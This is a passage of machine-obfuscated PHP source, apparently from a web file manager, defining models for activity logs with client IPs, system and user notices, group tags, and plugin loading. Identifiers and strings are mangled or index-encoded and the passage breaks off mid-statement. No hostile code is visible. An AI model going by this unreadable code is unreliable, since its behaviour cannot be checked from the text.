$‚‚¼ˆî¶[$óë€®”×[0]] = $‚‚¼ˆî¶[$Ê¶êõ•Ÿ]; } $‚‚¼ˆî¶[$Îüƒ§¢ˆ[1885]] = LNG($Îüƒ§¢ˆ[2325]); $‚‚¼ˆî¶[$Îüƒ§¢ˆ[2320]] = LNG($Îüƒ§¢ˆ[2326]); return $‚‚¼ˆî¶; } public function addLog($±ñÀ ÖÑ, $‚Ğ®Æ¹” = array()) { $’çò’¿° =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($this->typeList[$±ñÀ ÖÑ])) { return; } $ñ‡šñºÉ = isset($‚Ğ®Æ¹”[$’çò’¿°[1704]]) ? $‚Ğ®Æ¹”[$’çò’¿°[1704]] : 0; if (!$ñ‡šñºÉ) { $ñ‡šñºÉ = Session::get($’çò’¿°[2040]); } if ($±ñÀ ÖÑ == $’çò’¿°[2294] && is_array($‚Ğ®Æ¹”[$’çò’¿°[2327]]) && !$‚Ğ®Æ¹”[$’çò’¿°[2327]]) { return; } $òàƒáÑÆ = get_client_ip(); if (!$‚Ğ®Æ¹” || strlen(json_encode($‚Ğ®Æ¹”)) >= 1024) { $‚Ğ®Æ¹” = array($’çò’¿°[2328] => $òàƒáÑÆ); } else { if (is_array($‚Ğ®Æ¹”)) { $‚Ğ®Æ¹”[$’çò’¿°[2328]] = $òàƒáÑÆ; } else { $‚Ğ®Æ¹” = array($’çò’¿°[1257] => $‚Ğ®Æ¹”, $’çò’¿°[2328] => $òàƒáÑÆ); } } $‚Ğ®Æ¹” = array($’çò’¿°[1694] => Session::sign(), $’çò’¿°[1695] => intval($ñ‡šñºÉ), $’çò’¿°[33] => $±ñÀ ÖÑ, $’çò’¿°[1697] => json_encode($‚Ğ®Æ¹”)); parent::add($‚Ğ®Æ¹”); } public function remove($´ØŠ®ÇŒ) { $this->where(array($_SERVER[Î‹ÃÂŞ„][463] => $´ØŠ®ÇŒ))->delete(); } private function _makeOrder($Õú‘»Ÿ± = '') { $²Ó›¢° =& $_SERVER[Î‹ÃÂŞ„]; $ ûÕœªƒ = $²Ó›¢°[217]; $ğïÄÆ±Ş = array($²Ó›¢°[493] => $²Ó›¢°[494], $²Ó›¢°[495] => $²Ó›¢°[496]); $“¡¡ŠüÉ = Input::get($²Ó›¢°[501], $²Ó›¢°[7], $²Ó›¢°[2076], array($²Ó›¢°[1993], $²Ó›¢°[495])); $“¡¡ŠüÉ = $ğïÄÆ±Ş[$“¡¡ŠüÉ]; $Õú‘»Ÿ± = $Õú‘»Ÿ± . "{$ ûÕœªƒ}\40{$“¡¡ŠüÉ}"; return $this->order($Õú‘»Ÿ±); } public function get($ãÅşšÅ = '') { $áÒ—Òí¼ =& $_SERVER[Î‹ÃÂŞ„]; if (!$ãÅşšÅ) { show_json(array()); } $Æ³²±ş½ = array(); if ($ãÅşšÅ[$áÒ—Òí¼[1704]]) { $Æ³²±ş½[$áÒ—Òí¼[1704]] = $ãÅşšÅ[$áÒ—Òí¼[1704]]; } if (isset($ãÅşšÅ[$áÒ—Òí¼[807]])) { $•ß¹ì˜ = $ãÅşšÅ[$áÒ—Òí¼[807]]; $‡ìñˆ«« = isset($ãÅşšÅ[$áÒ—Òí¼[808]]) ? $ãÅşšÅ[$áÒ—Òí¼[808]] : time(); $Æ³²±ş½[$áÒ—Òí¼[217]] = array($áÒ—Òí¼[379], array($•ß¹ì˜, $‡ìñˆ««)); } if ($ãÅşšÅ[$áÒ—Òí¼[33]]) { $×µÑÆŒÍ = explode($áÒ—Òí¼[50], $ãÅşšÅ[$áÒ—Òí¼[33]]); $ß‹¾ä±¸ = $this->typeFile(); $¾²”ï¾ñ = array(); foreach ($×µÑÆŒÍ as $ŠûˆïÄ„) { $¾²”ï¾ñ[] = $ŠûˆïÄ„; if (isset($ß‹¾ä±¸[$ŠûˆïÄ„])) { $¾²”ï¾ñ = array_merge($¾²”ï¾ñ, $ß‹¾ä±¸[$ŠûˆïÄ„]); } } $¾²”ï¾ñ = array_unique($¾²”ï¾ñ); if ($¾²”ï¾ñ) { $Æ³²±ş½[$áÒ—Òí¼[33]] = array($áÒ—Òí¼[7], $¾²”ï¾ñ); } } else { $Æ³²±ş½[$áÒ—Òí¼[33]] = array($áÒ—Òí¼[2329], $áÒ—Òí¼[2330]); } if (!empty($ãÅşšÅ[$áÒ—Òí¼[2328]])) { $Æ³²±ş½[$áÒ—Òí¼[496]] = array($áÒ—Òí¼[429], "\x25{$ãÅşšÅ[$áÒ—Òí¼[2328]]}\45"); } $ŞÑ¡æèÌ = $this->_makeOrder()->where($Æ³²±ş½)->selectPage(); if (empty($ŞÑ¡æèÌ[$áÒ—Òí¼[415]])) { show_json(array(), !0, $ŞÑ¡æèÌ[$áÒ—Òí¼[412]]); } $ŞÑ¡æèÌ[$áÒ—Òí¼[415]] = $this->logList($ŞÑ¡æèÌ[$áÒ—Òí¼[415]]); return $ŞÑ¡æèÌ; } private function ipAddress(&$Ì±†‰ëŠ) { $•¡æõÏå =& $_SERVER[Î‹ÃÂŞ„]; if (!empty($Ì±†‰ëŠ[$•¡æõÏå[2328]])) { $²ÃíÄÏ² = IpLocation::get($Ì±†‰ëŠ[$•¡æõÏå[2328]]); } else { $²ÃíÄÏ² = LNG($•¡æõÏå[2331]); } $Ì±†‰ëŠ[$•¡æõÏå[2332]] = $²ÃíÄÏ²; } private function descZipDownload($¤ó¿„˜Å, &$š±Ïòğ) { $×—˜„Š =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($¤ó¿„˜Å[$×—˜„Š[2333]])) { return; } $¯ÀÉš¸ƒ = json_decode($¤ó¿„˜Å[$×—˜„Š[2333]], !0); foreach ($¯ÀÉš¸ƒ as $Óù¨Ó²ì) { try { $¨¯¤â = IO::infoFullSimple($Óù¨Ó²ì[$×—˜„Š[86]]); } catch (Exception $†ù¡™Ëê) { continue; } $¤ó¿„˜Å[$×—˜„Š[86]] = $Óù¨Ó²ì[$×—˜„Š[86]]; $š±Ïòğ[] = $¤ó¿„˜Å[$×—˜„Š[183]] = $¨¯¤â[$×—˜„Š[183]]; $š±Ïòğ[] = $¤ó¿„˜Å[$×—˜„Š[2131]] = $¨¯¤â[$×—˜„Š[182]]; break; } return $¤ó¿„˜Å; } private function getSourceList(&$§®£ô—‰) { $ªŞ™¤§ô =& $_SERVER[Î‹ÃÂŞ„]; $óö£òıä = array(); foreach ($§®£ô—‰ as $±«ÒøÖ => $Çê—›) { $ÏÛ¤Ù± = json_decode($Çê—›[$ªŞ™¤§ô[496]], !0); if ($Çê—›[$ªŞ™¤§ô[33]] == $ªŞ™¤§ô[1876]) { $ÏÛ¤Ù± = $this->descZipDownload($ÏÛ¤Ù±, $óö£òıä); $§®£ô—‰[$±«ÒøÖ][$ªŞ™¤§ô[496]] = json_encode($ÏÛ¤Ù±); continue; } if (strpos($Çê—›[$ªŞ™¤§ô[33]], $ªŞ™¤§ô[2133]) !== 0) { if (!isset($ÏÛ¤Ù±[$ªŞ™¤§ô[86]]) || strpos($Çê—›[$ªŞ™¤§ô[33]], $ªŞ™¤§ô[2334]) !== 0) { continue; } try { $¬×”×ÇĞ = IO::infoFullSimple($ÏÛ¤Ù±[$ªŞ™¤§ô[86]]); } catch (Exception $º×áÛ·º) { continue; } $óö£òıä[] = $ÏÛ¤Ù±[$ªŞ™¤§ô[183]] = $¬×”×ÇĞ[$ªŞ™¤§ô[183]]; $óö£òıä[] = $ÏÛ¤Ù±[$ªŞ™¤§ô[2131]] = $¬×”×ÇĞ[$ªŞ™¤§ô[182]]; $§®£ô—‰[$±«ÒøÖ][$ªŞ™¤§ô[496]] = json_encode($ÏÛ¤Ù±); continue; } $óö£òıä[] = $ÏÛ¤Ù±[$ªŞ™¤§ô[183]]; $óö£òıä[] = $ÏÛ¤Ù±[$ªŞ™¤§ô[2131]]; if ($ÏÛ¤Ù±[$ªŞ™¤§ô[33]] == $ªŞ™¤§ô[591]) { $óö£òıä[] = $ÏÛ¤Ù±[$ªŞ™¤§ô[496]][$ªŞ™¤§ô[1215]]; $óö£òıä[] = $ÏÛ¤Ù±[$ªŞ™¤§ô[496]][$ªŞ™¤§ô[1216]]; } if ($ÏÛ¤Ù±[$ªŞ™¤§ô[33]] == $ªŞ™¤§ô[2141]) { $óö£òıä[] = $ÏÛ¤Ù±[$ªŞ™¤§ô[496]][$ªŞ™¤§ô[183]]; } } if (!$óö£òıä) { return array(); } return Model($ªŞ™¤§ô[872])->sourceListInfo($óö£òıä, !0); } private function logList($±ßì´‘) { $ışÑèòš =& $_SERVER[Î‹ÃÂŞ„]; $¢Ã¼ÀÙ± = array_to_keyvalue($±ßì´‘, $ışÑèòš[12], $ışÑèòš[1704]); $½¤›ŸÓ¹ = Model($ışÑèòš[570])->userListInfo(array_unique($¢Ã¼ÀÙ±)); $€ê³‡±É = $this->getSourceList($±ßì´‘); $ß‘ıĞ = $this->typeAll(); $âÈ£¦Éû = array(); $¤úÇíõ¤ = array(); foreach ($±ßì´‘ as $¾€¡çâ— => $éÇ»ÕÊš) { $ï¤ŸÕãº = $éÇ»ÕÊš[$ışÑèòš[33]]; $“ìäÀÉé = isset($½¤›ŸÓ¹[$éÇ»ÕÊš[$ışÑèòš[1704]]]) ? $½¤›ŸÓ¹[$éÇ»ÕÊš[$ışÑèòš[1704]]] : !1; $çñµÅ‡ = strpos($ï¤ŸÕãº, $ışÑèòš[2335]) === 0 ? LNG($ışÑèòš[2336]) : LNG($ışÑèòš[2331]); $éÇ»ÕÊš[$ışÑèòš[32]] = isset($“ìäÀÉé[$ışÑèòš[32]]) ? $“ìäÀÉé[$ışÑèòš[32]] : LNG($ışÑèòš[2331]); $éÇ»ÕÊš[$ışÑèòš[2185]] = isset($“ìäÀÉé[$ışÑèòš[2185]]) ? $“ìäÀÉé[$ışÑèòš[2185]] : $ışÑèòš[12]; $éÇ»ÕÊš[$ışÑèòš[1600]] = isset($ß‘ıĞ[$ï¤ŸÕãº]) ? $ß‘ıĞ[$ï¤ŸÕãº] : $çñµÅ‡; $éÇ»ÕÊš[$ışÑèòš[2075]] = $“ìäÀÉé; $È†‹šõ¡ = json_decode($éÇ»ÕÊš[$ışÑèòš[496]], !0); $éÇ»ÕÊš[$ışÑèòš[2328]] = isset($È†‹šõ¡[$ışÑèòš[2328]]) ? $È†‹šõ¡[$ışÑèòš[2328]] : $ışÑèòš[12]; $éÇ»ÕÊš[$ışÑèòš[2332]] = IpLocation::get($éÇ»ÕÊš[$ışÑèòš[2328]]); if (strpos($ï¤ŸÕãº, $ışÑèòš[2133]) === 0 || isset($È†‹šõ¡[$ışÑèòš[2131]])) { $È†‹šõ¡[$ışÑèòš[89]] = $€ê³‡±É[$È†‹šõ¡[$ışÑèòš[183]]]; $È†‹šõ¡[$ışÑèòš[2146]] = $€ê³‡±É[$È†‹šõ¡[$ışÑèòš[2131]]]; if ($È†‹šõ¡[$ışÑèòš[33]] == $ışÑèòš[591]) { $È†‹šõ¡[$ışÑèòš[496]][$ışÑèòš[1215]] = $€ê³‡±É[$È†‹šõ¡[$ışÑèòš[496]][$ışÑèòš[1215]]]; $È†‹šõ¡[$ışÑèòš[496]][$ışÑèòš[1216]] = $€ê³‡±É[$È†‹šõ¡[$ışÑèòš[496]][$ışÑèòš[1216]]]; } if ($È†‹šõ¡[$ışÑèòš[33]] == $ışÑèòš[2141]) { $È†‹šõ¡[$ışÑèòš[496]][$ışÑèòš[183]] = $€ê³‡±É[$È†‹šõ¡[$ışÑèòš[496]][$ışÑèòš[183]]]; } if ($È†‹šõ¡[$ışÑèòš[33]] == $ışÑèòš[1871]) { $È†‹šõ¡[$ışÑèòš[2146]] = $È†‹šõ¡[$ışÑèòš[89]]; $È†‹šõ¡[$ışÑèòš[2131]] = $È†‹šõ¡[$ışÑèòš[2146]][$ışÑèòš[183]]; $È†‹šõ¡[$ışÑèòš[89]] = !1; $È†‹šõ¡[$ışÑèòš[183]] = $ışÑèòš[12]; } if ($È†‹šõ¡[$ışÑèòš[89]] && $È†‹šõ¡[$ışÑèòš[89]][$ışÑèòš[180]] == $ışÑèòš[181]) { $¤úÇíõ¤[] = $éÇ»ÕÊš[$ışÑèòš[445]]; unset($±ßì´‘[$¾€¡çâ—]); continue; } if ($È†‹šõ¡[$ışÑèòš[2146]] && $È†‹šõ¡[$ışÑèòš[2146]][$ışÑèòš[180]] == $ışÑèòš[181]) { $¤úÇíõ¤[] = $éÇ»ÕÊš[$ışÑèòš[445]]; unset($±ßì´‘[$¾€¡çâ—]); continue; } } $éÇ»ÕÊš[$ışÑèòš[496]] = $È†‹šõ¡; unset($éÇ»ÕÊš[$ışÑèòš[2337]]); $âÈ£¦Éû[] = $éÇ»ÕÊš; } $this->clearSystemPathLog($¤úÇíõ¤); return $âÈ£¦Éû; } private function clearSystemPathLog($ªÌ¾ı€) { $õñÉåÊ =& $_SERVER[Î‹ÃÂŞ„]; if (count($ªÌ¾ı€) == 0) { return; } $¿ÊŸˆÆƒ = array($õñÉåÊ[445] => array($õñÉåÊ[7], array_unique($ªÌ¾ı€))); $this->where($¿ÊŸˆÆƒ)->delete(); } public function deviceList($ƒÛëò¯ª, $‡‘¼ = 0) { $Œ»½íç =& $_SERVER[Î‹ÃÂŞ„]; $±Ş‰ª™™ = array($Œ»½íç[1704] => $ƒÛëò¯ª, $Œ»½íç[217] => array($Œ»½íç[1069], $‡‘¼), $Œ»½íç[33] => $Œ»½íç[1845]); $ÎÄÒ€ú = array(); $îÈ¨¨£Ñ = $this->field($Œ»½íç[2338])->where($±Ş‰ª™™)->order($Œ»½íç[2144])->limit(50)->select(); foreach ($îÈ¨¨£Ñ as $ùÛ–¦ú’ => $¬íò˜¥) { if ($ùÛ–¦ú’ > 0 && abs($¬íò˜¥[$Œ»½íç[217]] - $îÈ¨¨£Ñ[$ùÛ–¦ú’ - 1][$Œ»½íç[217]]) < 5) { continue; } $„ü¾µ¸ = json_decode($¬íò˜¥[$Œ»½íç[496]], !0); $¬íò˜¥[$Œ»½íç[2328]] = isset($„ü¾µ¸[$Œ»½íç[2328]]) ? $„ü¾µ¸[$Œ»½íç[2328]] : $Œ»½íç[12]; unset($„ü¾µ¸[$Œ»½íç[2328]]); $ıÜò­à = $this->deviceType($„ü¾µ¸[$Œ»½íç[2134]]); if (isset($ÎÄÒ€ú[$ıÜò­à])) { continue; } $¬íò˜¥[$Œ»½íç[2332]] = IpLocation::get($¬íò˜¥[$Œ»½íç[2328]]); $¬íò˜¥[$Œ»½íç[496]] = $„ü¾µ¸; $ÎÄÒ€ú[$ıÜò­à] = $¬íò˜¥; } return array_values($ÎÄÒ€ú); } public function deviceType($§øªµ°) { return $§øªµ°; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\156\157\x74\151\143\x65\x4c\151\x73\164"; public $field = array("\x6e\x61\155\145", "\x63\x6f\156\x74\145\156\164", "\141\x75\164\150", "\155\157\x64\145", "\x74\151\155\145", "\x74\171\x70\145", "\x6c\145\x76\x65\154", "\145\156\x61\142\x6c\x65", "\x73\x6f\x72\x74"); public function listData($¾¬ª¯Õñ = false, $ÍÆÇåğ³ = "\x73\x6f\162\x74", $–ò˜ŸåÁ = false) { return parent::listData($¾¬ª¯Õñ, $ÍÆÇåğ³, $–ò˜ŸåÁ); } public function add($Í½éÑÏ) { $ä¸Ï¢ˆ =& $_SERVER[Î‹ÃÂŞ„]; $ù¿”‰‚ú = time(); if ($Í½éÑÏ[$ä¸Ï¢ˆ[16]] == $ä¸Ï¢ˆ[2339]) { $ù¿”‰‚ú = strtotime($Í½éÑÏ[$ä¸Ï¢ˆ[196]]); } $Í½éÑÏ[$ä¸Ï¢ˆ[196]] = $ù¿”‰‚ú; return parent::insert($Í½éÑÏ); } public function update($­ìãƒè­, $¦–Ş™Å») { $À‰äå¤Û =& $_SERVER[Î‹ÃÂŞ„]; $Ú‰ı¥¢‚ = $this->listData($­ìãƒè­); if (!$Ú‰ı¥¢‚) { return !1; } $‡”ÊÑ’ = time(); if ($¦–Ş™Å»[$À‰äå¤Û[16]] == $À‰äå¤Û[2339]) { $‡”ÊÑ’ = strtotime($¦–Ş™Å»[$À‰äå¤Û[196]]); } $¦–Ş™Å»[$À‰äå¤Û[196]] = $‡”ÊÑ’; return parent::update($­ìãƒè­, $¦–Ş™Å»); } public function remove($Í›´¿³) { $øˆÌ¡¢² = $this->listData($Í›´¿³); if (!$øˆÌ¡¢² || $øˆÌ¡¢²[$_SERVER[Î‹ÃÂŞ„][181]]) { return !1; } return parent::remove($Í›´¿³); } public function sort($ã¢é¤™Î, $Ÿ—ü¤¤ƒ) { return parent::update($ã¢é¤™Î, $Ÿ—ü¤¤ƒ); } public function enable($Ÿøª–Úó, $ƒÙÊŒé) { return parent::update($Ÿøª–Úó, array($_SERVER[Î‹ÃÂŞ„][2340] => $ƒÙÊŒé)); } private function initUserOption() { $Åê¹³ä‹ =& $_SERVER[Î‹ÃÂŞ„]; $this->optionType = $Åê¹³ä‹[2341]; $this->modelType = $Åê¹³ä‹[2342]; $this->field = array($Åê¹³ä‹[2343], $Åê¹³ä‹[32], $Åê¹³ä‹[196], $Åê¹³ä‹[33], $Åê¹³ä‹[2344], $Åê¹³ä‹[797], $Åê¹³ä‹[212]); } public function userNoticeGet($ÁÈá÷ÕŸ = false) { $this->initUserOption(); return parent::listData($ÁÈá÷ÕŸ, $_SERVER[Î‹ÃÂŞ„][445], !0); } public function userNoticeAdd($‘˜£àùı) { $ê§Ú€¦ò =& $_SERVER[Î‹ÃÂŞ„]; $this->initUserOption(); $¤µªÖ¯Â = $this->findByKey($ê§Ú€¦ò[2343], $‘˜£àùı[$ê§Ú€¦ò[445]]); if ($¤µªÖ¯Â) { return !0; } $˜ó¦Øš = array($ê§Ú€¦ò[2343] => $‘˜£àùı[$ê§Ú€¦ò[445]], $ê§Ú€¦ò[32] => $‘˜£àùı[$ê§Ú€¦ò[32]], $ê§Ú€¦ò[196] => $‘˜£àùı[$ê§Ú€¦ò[196]], $ê§Ú€¦ò[33] => isset($‘˜£àùı[$ê§Ú€¦ò[33]]) ? $‘˜£àùı[$ê§Ú€¦ò[33]] : 1, $ê§Ú€¦ò[2344] => isset($‘˜£àùı[$ê§Ú€¦ò[2344]]) ? $‘˜£àùı[$ê§Ú€¦ò[2344]] : 0, $ê§Ú€¦ò[797] => 0, $ê§Ú€¦ò[212] => 0); return parent::insert($˜ó¦Øš); } public function userNoticeEdit($¥«Àù–†, $Ÿì¿äáƒ) { $this->initUserOption(); return parent::update($¥«Àù–†, $Ÿì¿äáƒ); } } goto Cª—ºŞ²ÏË; c¡›ĞøĞ¼ : class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\146\x61\166"; protected function cacheFunctionAlias($åÒ¿ÅáÃ) { $ÑÑòˆ¾ =& $_SERVER[Î‹ÃÂŞ„]; return array($ÑÑòˆ¾[2011] => array($åÒ¿ÅáÃ[0], $ÑÑòˆ¾[2012]), $ÑÑòˆ¾[2013] => array($åÒ¿ÅáÃ[0], $ÑÑòˆ¾[2014])); } protected function get($®ÁÅĞñÏ) { $«”—Ñ¼Ÿ =& $_SERVER[Î‹ÃÂŞ„]; $¼Ç¨³§ = Model($«”—Ñ¼Ÿ[557])->metaGet($®ÁÅĞñÏ, $«”—Ñ¼Ÿ[2015]); $Õ÷ùß”¤ = json_decode($¼Ç¨³§, !0); return $Õ÷ùß”¤ ? $Õ÷ùß”¤ : array($«”—Ñ¼Ÿ[2016] => $«”—Ñ¼Ÿ[90], $«”—Ñ¼Ÿ[415] => array()); } protected function set($ÇÚ¢ëÚğ, $†ã’æÀ) { $¦Û‚ßØÑ =& $_SERVER[Î‹ÃÂŞ„]; $†ã’æÀ = $†ã’æÀ ? $†ã’æÀ : array($¦Û‚ßØÑ[2016] => $¦Û‚ßØÑ[90], $¦Û‚ßØÑ[415] => array()); return Model($¦Û‚ßØÑ[557])->metaSet($ÇÚ¢ëÚğ, $¦Û‚ßØÑ[2015], json_encode($†ã’æÀ)); } protected function getByTagID($ğàıŒİÌ, $ã×× í®) { $ŸñŸ×¬ =& $_SERVER[Î‹ÃÂŞ„]; if (!$ğàıŒİÌ || !$ã×× í®) { return !1; } if (!Model($ŸñŸ×¬[557])->getInfoSimple($ğàıŒİÌ)) { return !1; } $¸êÕ„‘³ = $this->get($ğàıŒİÌ); if (!$¸êÕ„‘³ || !isset($¸êÕ„‘³[$ŸñŸ×¬[415]])) { return !1; } $Ú½±¬­À = array_find_by_field($¸êÕ„‘³[$ŸñŸ×¬[415]], $ŸñŸ×¬[445], $ã×× í®); return is_array($Ú½±¬­À) ? $Ú½±¬­À : !1; } public function listSource($Ä¶ÖøÕá, $ª¥ñ‡ß™) { $•óºÓ— =& $_SERVER[Î‹ÃÂŞ„]; if ($ª¥ñ‡ß™ && !is_array($ª¥ñ‡ß™)) { $ª¥ñ‡ß™ = array($ª¥ñ‡ß™); } $†À¬ªÜ· = $this->listData($Ä¶ÖøÕá); $³ÀêÛ€Ë = array(); foreach ($†À¬ªÜ· as $ôÛ¦‹Ôú) { $ëÇ¹Ğ = $ôÛ¦‹Ôú[$•óºÓ—[86]]; if (!$ëÇ¹Ğ) { continue; } if (!isset($³ÀêÛ€Ë[$ëÇ¹Ğ])) { $³ÀêÛ€Ë[$ëÇ¹Ğ] = array(); } $³ÀêÛ€Ë[$ëÇ¹Ğ][] = $ôÛ¦‹Ôú[$•óºÓ—[470]]; } $«µÈ¯¹ = array(); foreach ($³ÀêÛ€Ë as $å¥ÇÌ¿¯ => $¡â‚éıŞ) { $“ïáâ†’ = !0; if (!$ª¥ñ‡ß™) { $«µÈ¯¹[] = $å¥ÇÌ¿¯; continue; } foreach ($ª¥ñ‡ß™ as $ÏÛ…¬†) { if (!in_array($ÏÛ…¬†, $¡â‚éıŞ)) { $“ïáâ†’ = !1; break; } } if ($“ïáâ†’) { $«µÈ¯¹[] = $å¥ÇÌ¿¯; } } if (!$«µÈ¯¹) { return array(); } $‘™ÎÀè = array($•óºÓ—[461] => array($•óºÓ—[462], $«µÈ¯¹), $•óºÓ—[541] => $Ä¶ÖøÕá, $•óºÓ—[180] => SourceModel::TYPE_GROUP); $Æ£æ¾Šà = Model($•óºÓ—[1388])->listSource($‘™ÎÀè); if (!$Æ£æ¾Šà || count($«µÈ¯¹) == $Æ£æ¾Šà[$•óºÓ—[412]][$•óºÓ—[413]]) { return $Æ£æ¾Šà; } $®ô‹âÖ« = array(); $ş°½¼ƒ§ = array_to_keyvalue($Æ£æ¾Šà[$•óºÓ—[84]], $•óºÓ—[12], $•óºÓ—[183]); $¿µŒ˜’° = array_to_keyvalue($Æ£æ¾Šà[$•óºÓ—[85]], $•óºÓ—[12], $•óºÓ—[183]); $ºö‹—À½ = array_merge($¿µŒ˜’°, $ş°½¼ƒ§); foreach ($«µÈ¯¹ as $ëÇ¹Ğ) { if (!in_array($ëÇ¹Ğ, $ºö‹—À½)) { $®ô‹âÖ«[] = $ëÇ¹Ğ; } } if ($®ô‹âÖ«) { $this->removeBySource($Ä¶ÖøÕá, $®ô‹âÖ«); } return $Æ£æ¾Šà; } protected function listData($ŸãÓ¦ÅÒ) { $¹İ š´„ =& $_SERVER[Î‹ÃÂŞ„]; $çñ£Ìá  = array($¹İ š´„[1695] => 0, $¹İ š´„[528] => array($¹İ š´„[2017], 0), $¹İ š´„[466] => $¹İ š´„[2018] . $ŸãÓ¦ÅÒ); $¤ŠˆïÌÍ = $¹İ š´„[2019]; $Ù²ñ†¿ = $this->field($¤ŠˆïÌÍ)->where($çñ£Ìá )->order($¹İ š´„[2020])->select(); return $Ù²ñ†¿ ? $Ù²ñ†¿ : array(); } protected function addToTag($Î§Å‡Áò, $´Î”¢†“, $ÂÌí»ˆ•) { $¶ç†ã‚µ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->getByTagID($Î§Å‡Áò, $ÂÌí»ˆ•) || !$´Î”¢†“) { return !1; } if (!Model($¶ç†ã‚µ[872])->pathInfo($´Î”¢†“)) { return !1; } $×†ÃÎÊ = array($¶ç†ã‚µ[1695] => 0, $¶ç†ã‚µ[528] => $ÂÌí»ˆ•, $¶ç†ã‚µ[465] => $´Î”¢†“, $¶ç†ã‚µ[466] => $¶ç†ã‚µ[2021] . $Î§Å‡Áò, $¶ç†ã‚µ[464] => $¶ç†ã‚µ[12], $¶ç†ã‚µ[1906] => 0); if ($this->where($×†ÃÎÊ)->find()) { return !1; } return $this->add($×†ÃÎÊ); } protected function removeFromTag($ÆºÃÑáõ, $Úá×û¿Ä, $ÔùÕÍÈ) { $°÷ªŒ•ù =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->getByTagID($ÆºÃÑáõ, $ÔùÕÍÈ) || !$Úá×û¿Ä) { return !1; } if (is_array($Úá×û¿Ä)) { $Úá×û¿Ä = array($°÷ªŒ•ù[7], $Úá×û¿Ä); } $î®ĞÊ²· = array($°÷ªŒ•ù[1695] => 0, $°÷ªŒ•ù[528] => $ÔùÕÍÈ, $°÷ªŒ•ù[466] => $°÷ªŒ•ù[2021] . $ÆºÃÑáõ, $°÷ªŒ•ù[465] => $Úá×û¿Ä); return $this->where($î®ĞÊ²·)->delete(); } protected function removeByTag($®®Â›ÆÌ, $ÆÀÃ°Ğø) { $›É‰’å¹ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->getByTagID($®®Â›ÆÌ, $ÆÀÃ°Ğø)) { return !1; } $§ø¡ıó‘ = array($›É‰’å¹[1695] => 0, $›É‰’å¹[528] => $ÆÀÃ°Ğø, $›É‰’å¹[466] => $›É‰’å¹[2021] . $®®Â›ÆÌ); return $this->where($§ø¡ıó‘)->delete(); } protected function removeBySource($şí´¥»ñ, $Ï­œÀšˆ) { $³şñš =& $_SERVER[Î‹ÃÂŞ„]; if (!$şí´¥»ñ || !$Ï­œÀšˆ) { return !1; } if (is_array($Ï­œÀšˆ)) { $Ï­œÀšˆ = array($³şñš[7], $Ï­œÀšˆ); } $Òú¢«Èü = array($³şñš[1695] => 0, $³şñš[465] => $Ï­œÀšˆ, $³şñš[528] => array($³şñš[1069], 0), $³şñš[466] => $³şñš[2021] . $şí´¥»ñ); return $this->where($Òú¢«Èü)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\x70\154\165\147\x69\x6e\x4c\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\163\164\141\x74\165\163", "\x72\145\x67\151\x65\163\164", "\143\x6f\x6e\x66\x69\147"); public function loadList($ÑÀçö¢ = false) { $Ÿì’“éø = array_to_keyvalue($this->listData(), $_SERVER[Î‹ÃÂŞ„][32]); if ($ÑÀçö¢) { return $Ÿì’“éø[$ÑÀçö¢]; } return $Ÿì’“éø; } public function init() { $úËÄÖÀ‚ =& $_SERVER[Î‹ÃÂŞ„]; Hook::trigger($úËÄÖÀ‚[2022]); $·‹‘Öó = $this->loadPluginList(); foreach ($·‹‘Öó as $Ï€†¹‹ˆ => $‰Å×ş·Ï) { $õå¥å§Š = $this->appAllow($Ï€†¹‹ˆ, $‰Å×ş·Ï); if (!$õå¥å§Š) { continue; } foreach ($‰Å×ş·Ï[$úËÄÖÀ‚[2023]] as $°Çù¹ó => $¾ Ç¤‡Ç) { Hook::bind($°Çù¹ó, $¾ Ç¤‡Ç); } } Hook::trigger($úËÄÖÀ‚[2024]); Hook::trigger(ACTION); } public function appAllow($øÈ£¨è§, $˜´˜ã£Ë, $Êô±Ÿ‚† = true) { $àÀçÆúÇ =& $_SERVER[Î‹ÃÂŞ„]; $Ó·šÄ´Ä = PLUGIN_DIR . $øÈ£¨è§ . $àÀçÆúÇ[2025]; if (!is_array($˜´˜ã£Ë) || !is_array($˜´˜ã£Ë[$àÀçÆúÇ[2023]]) || $˜´˜ã£Ë[$àÀçÆúÇ[797]] != 1 || !is_file($Ó·šÄ´Ä)) { return !1; } if ($GLOBALS[$àÀçÆúÇ[539]] == 1) { if ($GLOBALS[$àÀçÆúÇ[6]][$àÀçÆúÇ[2026]] || !$GLOBALS[$àÀçÆúÇ[6]][$àÀçÆúÇ[2027]]) { return !0; } $ñ÷¿ªª‹ = explode($àÀçÆúÇ[50], strtolower($GLOBALS[$àÀçÆúÇ[6]][$àÀçÆúÇ[2027]])); return in_array(strtolower($øÈ£¨è§), $ñ÷¿ªª‹) ? !1 : !0; } if ($Êô±Ÿ‚† && !Action($àÀçÆúÇ[2028])->checkAuth($øÈ£¨è§)) { return !1; } return !0; } public function unInstall($ƒ¹•ó£) { $Ô˜’Å‹ =& $_SERVER[Î‹ÃÂŞ„]; $®º¢¡èè = $this->loadList($ƒ¹•ó£); if (file_exists(PLUGIN_DIR . $ƒ¹•ó£)) { Hook::apply($ƒ¹•ó£ . $Ô˜’Å‹[2029]); } $this->remove($®º¢¡èè[$Ô˜’Å‹[445]]); } public function changeStatus($æÑ‡Ü¡, $É­İ¡…Ã) { $ªÓ†ÚÙ“ =& $_SERVER[Î‹ÃÂŞ„]; $»„›šè = $this->loadList($æÑ‡Ü¡); if ($É­İ¡…Ã) { Hook::apply($æÑ‡Ü¡ . $ªÓ†ÚÙ“[2030]); } $this->update($»„›šè[$ªÓ†ÚÙ“[445]], array($ªÓ†ÚÙ“[2031] => $É­İ¡…Ã)); } public function appRegist($ĞÄÜëèê, $è®Ç­ãæ) { $ÇüéŸûµ =& $_SERVER[Î‹ÃÂŞ„]; $¿Ñ‹ø … = $this->loadList($ĞÄÜëèê); if ($¿Ñ‹ø …) { $this->update($¿Ñ‹ø …[$ÇüéŸûµ[445]], array($ÇüéŸûµ[2023] => $è®Ç­ãæ)); } else { $áºÅÍ = array($ÇüéŸûµ[32] => $ĞÄÜëèê, $ÇüéŸûµ[2023] => 